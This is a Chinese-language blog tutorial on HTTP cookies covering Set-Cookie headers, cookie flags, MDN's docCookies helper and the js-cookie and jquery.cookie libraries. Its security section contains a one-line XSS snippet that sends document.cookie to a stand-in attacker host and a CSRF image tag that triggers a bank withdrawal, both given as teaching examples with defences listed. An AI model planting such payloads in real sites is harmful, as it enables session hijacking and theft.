---
title: Cookie一箩筐
permalink: cookie
tags:
  - 基础
categories:
  - 其他
date: 2019-06-21 13:22:34
updated: 2019-06-21 13:22:34
---

# 概述

HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。

<!-- more -->

Cookie 主要用于以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB 。

# 详述

## 创建 Cookie

当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 Set-Cookie 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 Cookie 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

### Set-Cookie 响应头部和 Cookie 请求头部

服务器使用`Set-Cookie`响应头部向用户代理（一般是浏览器）发送 Cookie 信息。一个简单的 Cookie 可能像这样：

```
Set-Cookie: <cookie名>=<cookie值>
```

服务器通过该头部告知客户端**保存**Cookie 信息。

对于服务端程序中设置 Set-Cookie 响应头信息，不同语言有各自的语法，Node.JS 示例如下：

```js
response.setHeader("Set-Cookie", ["type=ninja", "language=javascript"]);
```

响应头示例：

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry
```

下一次的请求头示例：

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

## 几个概念

会话期 Cookie：浏览器关闭自动删除 cookie。

持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）。

Cookie 的 Secure 标记：Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。

Cookie 的 HttpOnly 标记：只能发送给服务端而不能被 JavaScript 脚本调用。

Cookie 的作用域：Domain 和 Path 标识定义了 Cookie 的作用域，即 Cookie 应该发送给哪些 URL。

JavaScript 调用：通过 Document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。

## 安全

> 当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息。

### 会话劫持和 XSS

```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

### 跨站请求伪造（CSRF）

比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：

```html
<img
  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory"
/>
```

当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：

- 对用户输入进行过滤来阻止 XSS；
- 任何敏感操作都需要确认；
- 用于敏感信息的 Cookie 只能拥有较短的生命周期；
- 更多方法可以查看[OWASP CSRF prevention cheat sheet](<https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>)。

## 封装一个 cookie 使用库

写入一个 cookie：`docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])`

获取一个 cookie：`docCookies.getItem(name)`

移除一个 cookie：`docCookies.removeItem(name[, path[, domain]])`

检查一个 cookie（是否存在）：`docCookies.hasItem(name)`

获取所有 cookie 列表：`docCookies.keys()`

```js
/*\
|*|
|*|  :: cookies.js ::
|*|
|*|  A complete cookies reader/writer framework with full unicode support.
|*|
|*|  Revision #1 - September 4, 2014
|*|
|*|  https://developer.mozilla.org/en-US/docs/Web/API/document.cookie
|*|  https://developer.mozilla.org/User:fusionchess
|*|  https://github.com/madmurphy/cookies.js
|*|
|*|  This framework is released under the GNU Public License, version 3 or later.
|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html
|*|
|*|  Syntaxes:
|*|
|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
|*|  * docCookies.getItem(name)
|*|  * docCookies.removeItem(name[, path[, domain]])
|*|  * docCookies.hasItem(name)
|*|  * docCookies.keys()
|*|
\*/

var docCookies = {
  getItem: function(sKey) {
    if (!sKey) {
      return null;
    }
    return (
      decodeURIComponent(
        document.cookie.replace(
          new RegExp(
            "(?:(?:^|.*;)\\s*" +
              encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&") +
              "\\s*\\=\\s*([^;]*).*$)|^.*$"
          ),
          "$1"
        )
      ) || null
    );
  },
  setItem: function(sKey, sValue, vEnd, sPath, sDomain, bSecure) {
    if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) {
      return false;
    }
    var sExpires = "";
    if (vEnd) {
      switch (vEnd.constructor) {
        case Number:
          sExpires =
            vEnd === Infinity
              ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT"
              : "; max-age=" + vEnd;
          break;
        case String:
          sExpires = "; expires=" + vEnd;
          break;
        case Date:
          sExpires = "; expires=" + vEnd.toUTCString();
          break;
      }
    }
    document.cookie =
      encodeURIComponent(sKey) +
      "=" +
      encodeURIComponent(sValue) +
      sExpires +
      (sDomain ? "; domain=" + sDomain : "") +
      (sPath ? "; path=" + sPath : "") +
      (bSecure ? "; secure" : "");
    return true;
  },
  removeItem: function(sKey, sPath, sDomain) {
    if (!this.hasItem(sKey)) {
      return false;
    }
    document.cookie =
      encodeURIComponent(sKey) +
      "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" +
      (sDomain ? "; domain=" + sDomain : "") +
      (sPath ? "; path=" + sPath : "");
    return true;
  },
  hasItem: function(sKey) {
    if (!sKey) {
      return false;
    }
    return new RegExp(
      "(?:^|;\\s*)" +
        encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&") +
        "\\s*\\="
    ).test(document.cookie);
  },
  keys: function() {
    var aKeys = document.cookie
      .replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "")
      .split(/\s*(?:\=[^;]*)?;\s*/);
    for (var nLen = aKeys.length, nIdx = 0; nIdx < nLen; nIdx++) {
      aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]);
    }
    return aKeys;
  }
};
```

## 第三方库

[jquery.cookie.js](https://github.com/carhartl/jquery-cookie#readme)官方已停止维护，并推荐使用全新的[js-cookie](https://github.com/js-cookie/js-cookie)。

### js-cookie

```js
// 创建一个cookie，在整个网站有效
Cookies.set("name", "value");
// 创建一个cookie，有效期为7天，整个网站有效
Cookies.set("name", "value", { expires: 7 });
// 创建一个cookie，有效期7天，当前路径有效
Cookies.set("name", "value", { expires: 7, path: "" });

// 读取
Cookies.get("name"); // => 'value'
Cookies.get("nothing"); // => undefined
// 读取所有
Cookies.get(); // => { name: 'value' }
// 通过设置domain或者path来读取特定cookie是不起效果的
Cookies.get("foo", { domain: "sub.example.com" }); // `domain` won't have any effect...!
// 删除
Cookies.remove("name");
// 对于设置了domain或者path的cookie，删除时也必须配置相应的属性参数
Cookies.set("name", "value", { path: "" });
Cookies.remove("name"); // fail!
Cookies.remove("name", { path: "" }); // removed!

Cookies.remove("name", { path: "", domain: ".yourdomain.com" });
```

### jquery.cookie.js

使用逻辑与 `js-cookie` 一致

```js
// Create session cookie:
$.cookie("name", "value");

// Create expiring cookie, 7 days from then:
$.cookie("name", "value", { expires: 7 });

// Create expiring cookie, valid across entire site:
$.cookie("name", "value", { expires: 7, path: "/" });

// Read cookie:
$.cookie("name"); // => "value"
$.cookie("nothing"); // => undefined

// Read all available cookies:
$.cookie(); // => { "name": "value" }

// Delete cookie:

// Returns true when cookie was successfully deleted, otherwise false
$.removeCookie("name"); // => true
$.removeCookie("nothing"); // => false

// Need to use the same attributes (path, domain) as what the cookie was written with
$.cookie("name", "value", { path: "/" });
// This won't work!
$.removeCookie("name"); // => false
// This will work!
$.removeCookie("name", { path: "/" }); // => true

// Note: when deleting a cookie, you must pass the exact same path, domain and secure options that were used to set the cookie, unless you're relying on the default options that is.
```

## 实践场景

系统升级后，对于历史 B 类买家，第一次登陆系统后在对应的承载页给出弹框提示。
实现思路：登陆时后端根据账户数据判断出是否为符合条件的用户，符合则在响应头中设置 cookie 值，前端页面加载时获取对应的 cookie 值，判断是否需要显示弹框。弹框确认关闭后清除 cookie。

# 参考

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies

https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie/Simple_document.cookie_framework
